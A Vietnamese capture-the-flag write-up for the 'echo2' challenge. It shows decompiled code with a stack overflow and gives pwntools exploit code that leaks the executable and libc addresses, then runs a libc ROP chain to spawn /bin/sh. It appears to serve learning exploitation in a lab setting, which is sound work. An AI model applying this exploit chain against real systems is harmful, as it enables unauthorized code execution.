# echo2

## IDA

```c
int echo()
{
  char ptr[264]; // [rsp+0h] [rbp-110h] BYREF
  int v2[2]; // [rsp+108h] [rbp-8h] BYREF

  puts("Welcome to Echo2");
  v2[1] = __isoc99_scanf("%d", v2);
  fread(ptr, 1uLL, v2[0], stdin);
  return printf("Echo2: %s\n", ptr);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  echo();
  puts("Goodbye from Echo2");
  return 0;
}
```

## Ý tưởng

- mảng v2[] được khai báo int (4byte)
- `  v2[1] = __isoc99_scanf("%d", v2);` dòng này hơi lạ, em tìm trên gpt thì em hiểu:
- hàm scanf() trả về số lượng phần tử đã được gán giá trị thành công. (ở đây là 1 (do nhập vào là số))
- và ta ghi giá trị vào v2 là con trỏ, là ta đang ghi vào v2[0]
- Như vậy, ta có thể ow được rip để điều khiển
- Do hàm này không có hàm tạo shell nên có thể là ret2libc, ta cần leak được libc, nhưng do địa chỉ động nên ta cần leak địa chỉ exe, để có got

## Thực thi

### Leak exe

- Ta sẽ ow rbp để khi %s nó sẽ luôn địa chỉ ret của echo

```python
    payload = b'a'*279
    r.sendlineafter(b'Echo2\n', b"280")
    r.send(payload)
```

- Nó sẽ leak cho ta ret của echo nhưng như vậy chưa đủ vì leak xong chương trình kết thúc
- Ta kiểm tra địa chỉ của ret echo là `0x00558efb2072b3` và main là `0x558efb207247`
- 2 địa chỉ khá giống nhau nên ta chỉ cần ghi thêm 1 byte để ghi đè ret echo thành main để khi kết thúc nó sẽ chạy lại chương trình
- Do nhảy vào đầu main có lỗi xmm1 nên ta sẽ nhảy vào main + 5 là cần ghi đè thành byte 0x4c ("L")
- Nên sửa lại payload một xíu, và tính toán exe base

```python
    payload = b'a'*279 + b"L"
    r.sendlineafter(b'Echo2\n', b"281")
    r.send(payload)

    r.recvuntil(b'a'*279)
    exe_leak = u64(r.recvline(keepends=False) + b'\0\0')
    exe.address = exe_leak - 4684
    log.info("leak exe: " + hex(exe_leak))
    log.info("base exe: " + hex(exe.address))
```

### Leak libc

- chỗ này em thắc mắc tại sao phải đưa ret vào =(( (em co script của a)

```python
    ret = exe.address + 0x000000000000101a
    payload = b'b'*279
    payload += p64(ret) + p64(exe.plt['printf'])
    payload += p64(ret) + p64(exe.sym['echo'])
    r.sendlineafter(b'Echo2\n', str((len(payload) + 1)))
    r.send(payload)

    r.recvlines(2)
    leak_libc = u64(r.recvuntil(b'Welcome', drop=True) + b"\0\0")
    libc.address = leak_libc - 401616
    log.info("leak libc: " + hex(leak_libc))
    log.info("leak libc: " + hex(libc.address))
```

### rop

- Đến đây ta có thể dùng one_gadget, tuy nhiên khi sử dụng one_gadget mặc dù đã thoả các điều kiện rồi nhưng vẫn lỗi, buộc ta phải rop bằng tay =)))
- Dùng ROPgadget trong file exe không có các pop nên ta sẽ sử dụng ROPgadget lên file libc vì nó có đầy đủ
- Ta cần pop các thanh ghi sau

```
    rsi = libc.address + 0x000000000002be51
    rdi = libc.address + 0x000000000002a3e5
    rax_rdx_rbx = libc.address + 0x0000000000090528
    syscall = libc.address + 0x0000000000029db4
```

- Cuối cùng tạo shell ta tạo shell thui

```python
    payload = b'a'*279
    payload += flat(
        rsi, 0,
        rdi, next(libc.search(b"/bin/sh")),
        rax_rdx_rbx, 0x3b, 0x0, 0x0,
        syscall
    )
    r.sendlineafter(b'Echo2\n', str((len(payload) + 1)))
    r.send(payload)
```
